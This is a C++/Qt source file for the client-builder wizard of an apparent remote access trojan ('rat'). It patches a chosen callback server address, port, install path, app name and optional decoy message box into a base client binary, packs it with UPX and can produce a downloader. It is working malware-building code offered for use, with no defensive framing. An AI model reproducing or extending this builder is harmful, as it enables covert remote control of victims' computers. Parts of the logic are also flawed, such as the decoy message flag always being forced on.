#include "clientbuildwizard.h"

#include "../common/pathplaceholder.h"
#include "appsettings.h"

#include <QFileDialog>
#include <QHostAddress>
#include <QMessageBox>
#include <QNetworkInterface>
#include <QProcess>
#include <QStateMachine>
#include "../config.h"

ClientBuildWizard::ClientBuildWizard(QWidget *parent) :
    QWizard(parent)
{
    setupUi(this);

#ifdef RAT_OS_LINUX
    radioButtonLinux->setChecked(true);
#endif
#ifdef RAT_OS_ANDROID
    radioButtonAndroid->setChecked(true);
#endif
#ifdef RAT_OS_WINDOWS
    radioButtonWindows->setChecked(true);
#endif
#ifdef RAT_OS_MAC
    radioButtonMacos->setChecked(true);
#endif

    const QHostAddress &localhost = QHostAddress(QHostAddress::LocalHost);
    for (const QHostAddress &address: QNetworkInterface::allAddresses()) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && address != localhost)
            comboBoxServerAddress->addItem(address.toString());
    }

    spinBoxPort->setValue(RatAppSettings->ratPort());
    spinBoxInstallerPort->setValue(RatAppSettings->installerPort());

    if (!AppSettings::supportsInstaller()) {
        spinBoxInstallerPort->hide();
        labelInstallerPort->hide();
    }

    auto placeHolders = PathPlaceholder::placeholders();
    QString links;
    foreach (auto p, placeHolders) {
        if (!links.isEmpty())
            links.append("&nbsp;&nbsp;&nbsp; ");
        links.append(QString("<a href=\"%1\">%1</a>").arg(p));
    }
    labelStandardPaths->setText(links);
}

void ClientBuildWizard::on_labelStandardPaths_linkActivated(const QString &link)
{
    lineEditInstallPath->insert("$" + link + "$");
}

void ClientBuildWizard::on_lineEditInstallPath_textChanged(const QString &s)
{
    labelThisPc->setText(PathPlaceholder::validateLocation(s));
}

void ClientBuildWizard::on_toolButtonBrowseOutput_clicked()
{
    QString filter;
    if (radioButtonLinux->isChecked())
        filter = "Bash script (*.sh)";

    if (radioButtonWindows->isChecked())
        filter = "Windows exe file (*.exe)";

    if (radioButtonAndroid->isChecked())
        filter = "Android package (*.apk)";

    if (radioButtonMacos->isChecked())
        filter = "Mas os package (*.pkg)";

    auto fn = QFileDialog::getSaveFileName(this, tr("Select output file"),
                                 QString(), filter);

    if (!fn.isEmpty())
        lineEditOutput->setText(fn);
}

void ClientBuildWizard::build()
{
    if (radioButtonByAddressAndPort->isChecked()) {
        if (comboBoxServerAddress->currentText().isEmpty()) {
            QMessageBox::warning(this, windowTitle(),
                                 tr("Server address is invalid"));
            return;
        }
    }
    if (lineEditOutput->text().isEmpty()) {
        QMessageBox::warning(this, windowTitle(),
                             tr("Please select output file path"));
        return;
    }

    bool ok = false;
    if (radioButtonWindows->isChecked())
        ok = createClient();

    if (radioButtonLinux->isChecked())
        ok = createClient();

    if (ok)
        QMessageBox::information(this, windowTitle(),
                                 tr("Client was created successfully"));
    else
        QMessageBox::warning(this, windowTitle(),
                             tr("Client generation was fails"));
}


void ClientBuildWizard::compressUpx()
{
    QStringList args = QStringList()
        << "-9"
        << "-o" << lineEditOutput->text()
        << qApp->applicationDirPath().replace("/", "\\") + "\\builder\\windows\\Client.exe";
    QProcess p;
    p.setProgram("upx");
    p.setArguments(args);
    p.start();
    p.waitForFinished();
}

bool ClientBuildWizard::createWindowsDownloader()
{
    QStringList args = QStringList()
            << "--input" << qApp->applicationDirPath().replace("/", "\\") + "\\builder\\windows\\Client.exe"
            << "--webport" << QString::number(spinBoxInstallerPort->value())
            << "--output" << lineEditOutput->text()
            << "--port" << QString::number(spinBoxPort->value())
            << "--server" << comboBoxServerAddress->currentText();
    QProcess p;
    p.setProgram(qApp->applicationDirPath() + "/builder/windows/ClientMaker.exe");
    p.setArguments(args);
    p.start();
    p.waitForFinished();
    auto buffer = p.readAllStandardOutput().toLower();
    qDebug() << buffer;
    if (p.exitCode())
        return false;
    return buffer.contains("*ok*");
}

bool ClientBuildWizard::createClient()
{
//    QByteArray content;
//    auto replace_var = [&content](const QString &name, const QString &value) -> bool {
//        QString searchTerm = "**" + name + "**";
//        auto i = content.indexOf(searchTerm);
//        if (i == -1)
//            return false;

//        auto closePos = content.indexOf("**", i);
//        bool ok;
//        auto len = content.mid(i + searchTerm.length(), closePos - i - searchTerm.length()).toInt(&ok);
//        if (!ok)
//            return false;

//        content.remove(i, len);
//        QByteArray extraSpaces(len - value.length(), ' ');
//        content.insert(i, value.toLatin1() + extraSpaces);

//        qDebug() << name << i;
//        return true;
//    };
    QString baseFile;
#ifdef QT_NO_DEBUG
    baseFile = QString("%1/builder/%2/base.dat")
                   .arg(qApp->applicationDirPath(), selectedPlatform());
#else
#   ifdef Q_OS_LINUX
      baseFile = "/doc/dev/Qt/rat/output/builder/linux/client";
#   else
       baseFile = "D:/dev/Qt/rat/build/client/Qt_lite/Release/client.exe";
#   endif
#endif
      QFile f(baseFile);

    if (!f.open(QIODevice::ReadOnly))
        return false;

    content = f.readAll();
    f.close();

    setOption("is_ready", true);
    setOption("server", comboBoxServerAddress->currentText());
    setOption("port", spinBoxPort->value());
    setOption("app_name", lineEditAppName->text());

    if (checkBoxShowMessageBox->isChecked()) {
        setOption("show_message", true);
        setOption("message_header", lineEditTitle->text());
        setOption("message_body", textEditBody->toPlainText());
    } else {
        setOption("show_message", false);
    }

    setOption("install_path", lineEditInstallPath->text());
    setOption("show_message", true);

    QFile out(lineEditOutput->text());

    if (!out.open(QIODevice::WriteOnly))
        return false;

    out.write(content);
    out.close();
    out.setPermissions(out.permissions() | QFileDevice::ExeUser);

    return true;
}

QString ClientBuildWizard::selectedPlatform() const
{
    if (radioButtonLinux->isChecked())
        return "linux";

    if (radioButtonWindows->isChecked())
        return "windows";

    if (radioButtonAndroid->isChecked())
        return "android";

    if (radioButtonMacos->isChecked())
        return "macos";

    return QString();
}

bool ClientBuildWizard::setOption(const QString &name, const QString &value)
{
    QString searchTerm = "**" + name + "**";
    auto i = content.indexOf(searchTerm);
    if (i == -1) {
        qDebug() << "Index for" << name << "not found";
        return false;
    }

    auto closePos = content.indexOf("**", i + searchTerm.length());
    bool ok;
    auto len = content.mid(i + searchTerm.length(), closePos - i - searchTerm.length()).toInt(&ok);
    if (!ok) {
        qDebug() << "Len for" << name << "not found" << content.mid(i + searchTerm.length(), closePos - i + searchTerm.length());
        return false;
    }

    content.remove(i, len);
    QByteArray extraSpaces(len - value.length(), ' ');
    content.insert(i, value.toLatin1() + extraSpaces);

    qDebug() << name << i;
    return true;
}

bool ClientBuildWizard::setOption(const QString &name, const int &value)
{
    return setOption(name, QString::number(value));
}

bool ClientBuildWizard::setOption(const QString &name, const bool &value)
{
    return setOption(name, QString(value ? "true" : "false"));
}

void ClientBuildWizard::on_ClientBuildWizard_accepted()
{
    build();
}

int ClientBuildWizard::nextId() const
{
    if (currentPage() == wizardPageConnection) {
        return radioButtonAndroid->isChecked()
                ? currentId() + 2
                : currentId() + 1;
    }
    if (!radioButtonAndroid->isChecked() && currentPage() == wizardPageInstallPath)
        return currentId() + 2;

    if (radioButtonAndroid->isChecked() && currentPage() == wizardPageApkSettings)
        return currentId() + 2;

    return QWizard::nextId();
}

bool ClientBuildWizard::validateCurrentPage()
{
    if (currentPage() == wizardPageInstallPath) {
        auto installPath = lineEditInstallPath->text().replace("\\", "/");
        if (!installPath.count('/')) {
            QMessageBox::warning(this, windowTitle(),
                                 tr("Invalid install path"));
            return false;
        }
        if (lineEditAppName->text().isEmpty()) {
            QMessageBox::warning(this, windowTitle(),
                                 tr("Please enter app name"));
            return false;
        }
    }
    if (currentPage() == wizardPageoutputPath) {
        if (lineEditOutput->text().isEmpty()) {
            QMessageBox::warning(this, windowTitle(),
                                 tr("Please enter output path"));
            return false;
        }
    }

    return QWizard::validateCurrentPage();
}
